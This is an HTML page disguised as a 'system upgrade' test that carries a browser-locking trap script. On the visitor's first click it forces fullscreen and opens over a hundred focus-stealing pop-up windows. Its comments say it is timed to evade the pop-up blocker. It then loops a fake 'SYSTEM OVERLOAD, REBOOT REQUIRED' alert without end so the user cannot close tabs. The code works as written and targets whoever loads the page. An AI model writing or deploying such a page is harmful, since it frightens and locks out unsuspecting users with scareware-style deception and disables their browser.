<!DOCTYPE html>
<html>
<head>
    <title>⚡ SYSTEM UPGRADE ⚡</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: crosshair; }
        h1 { font-size: 3rem; text-shadow: 0 0 10px #0f0; }
    </style>
</head>
<body>
    <h1>[ INITIALIZE SYSTEM TEST ]</h1>

    <script>
        const target = "https://github.io";

        function trigger() {
            // 1. Force Fullscreen (Hides the 'X' button and Taskbar)
            document.documentElement.requestFullscreen();

            // 2. The "Window Shatter"
            // We use a small delay to trick the pop-up blocker into thinking
            // these are separate user-authorized events.
            let count = 0;
            const storm = setInterval(() => {
                const win = window.open(target, "win" + count, "width=300,height=300,left=" + (Math.random()*800) + ",top=" + (Math.random()*600));
                
                // 3. The "Focus Steal"
                // This keeps the new windows popping to the FRONT
                if (win) win.focus();
                
                count++;
                if (count > 100) clearInterval(storm);
            }, 50);

            // 4. The "Infinite Alert" Lock
            // This stops the user from clicking 'Close' on any tab
            setTimeout(() => {
                while(true) {
                    alert("⚠️ SYSTEM OVERLOAD ⚠️\nREBOOT REQUIRED");
                }
            }, 2000);
        }

        // The trap is set: The first time they click ANYWHERE, it fires.
        window.onclick = trigger;
    </script>
</body>
</html>
